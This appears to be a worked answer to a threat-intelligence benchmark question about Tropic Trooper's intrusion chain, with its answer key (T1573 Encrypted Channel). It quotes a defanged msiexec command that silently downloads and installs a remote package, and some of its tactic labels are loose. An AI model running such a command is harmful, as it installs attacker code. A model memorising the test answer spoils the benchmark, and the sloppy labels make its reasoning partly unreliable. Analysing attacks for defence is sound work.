@@ -1,0 +1,64 @@
+### Step-by-Step Analysis
+
+#### 1. Analyze the CTI Report
+
+**Initial Access:**
+- Tropic Trooper used exploits for CVE-2017-11882 or CVE-2018-0802 to execute commands.
+- They downloaded and installed an installer package (.msi) using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.
+
+**Execution:**
+- The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) and then deleted itself.
+- UserInstall.exe dropped a normal sidebar.exe file, a malicious loader (wab32res.dll), and an encrypted configuration file.
+- UserInstall.exe used BITSadmin to create a job and launch sidebar.exe.
+- The malicious loader used DLL hijacking on sidebar.exe and launched dllhost.exe.
+- The loader injected a DLL backdoor into dllhost.exe.
+
+**Persistence:**
+- The backdoor decrypts the encrypted configuration file and uses SSL to connect to C&C servers.
+
+**Defense Evasion:**
+- DLL hijacking was used to evade antivirus detection.
+- The installer dropped files into the Apple/Update directory and created a hidden directory (UFile) as a ruse.
+- The loader executed dllhost.exe and injected a malicious DLL file (the backdoor) into this process.
+
+**Others:**
+- Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware.
+- The documents use job vacancies in socio-politically sensitive organizations to lure targets.
+- The MSI file drops three files and creates a hidden directory (UFile) as a ruse.
+- The backdoor uses custom SSL libraries to connect to the C&C server.
+
+#### 2. Analyze the Question
+
+**Question:**
+- After Tropic Trooper's backdoor decrypted its configuration file and connected using the SSL protocol, which ATT&CK technique most likely occurred before they leveraged custom SSL libraries to securely connect to the C&C server?
+
+**Answer Choices:**
+- A: T1598.001-Spearphishing Service
+- B: T1573-Encrypted Channel
+- C: T1001.002-Steganography
+- D: T1072-Software Deployment Tools
+
+#### 3. Compare and Evaluate
+
+**Sequence of TTPs:**
+1. **Initial Access:** Exploits CVE-2017-11882 or CVE-2018-0802 to execute commands.
+2. **Execution:** Downloads and installs an installer package.
+3. **Execution:** Backdoor installer drops files and uses BITSadmin to launch sidebar.exe.
+4. **Execution:** Malicious loader uses DLL hijacking and injects a DLL backdoor into dllhost.exe.
+5. **Persistence:** Backdoor decrypts the configuration file.
+6. **Defense Evasion:** Uses custom SSL libraries to connect to the C&C server.
+
+**Evaluation of Answer Choices:**
+- **A: T1598.001-Spearphishing Service:** This technique involves using a service to send spearphishing messages. The report mentions that Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware, which could be part of a spearphishing campaign. However, this technique is more relevant to the initial access phase, not the post-decryption and pre-SSL connection phase.
+- **B: T1573-Encrypted Channel:** This technique involves using an encrypted channel to communicate with the C&C server. The report explicitly states that the backdoor uses SSL to connect to the C&C server, which aligns with this technique.
+- **C: T1001.002-Steganography:** This technique involves hiding data within other data. The report does not mention any use of steganography.
+- **D: T1072-Software Deployment Tools:** This technique involves using legitimate software deployment tools to deploy malware. The report mentions the use of BITSadmin, which is a software deployment tool, but this is part of the execution phase, not the post-decryption and pre-SSL connection phase.
+
+#### 4. Provide a Step-by-Step Reasoning and Final Answer
+
+**Reasoning:**
+- The backdoor decrypts the configuration file and then uses SSL to connect to the C&C server.
+- The use of SSL to connect to the C&C server is explicitly mentioned in the report.
+- The technique T1573-Encrypted Channel aligns with the use of SSL to securely communicate with the C&C server.
+
+**Final Answer: B: T1573-Encrypted Channel**
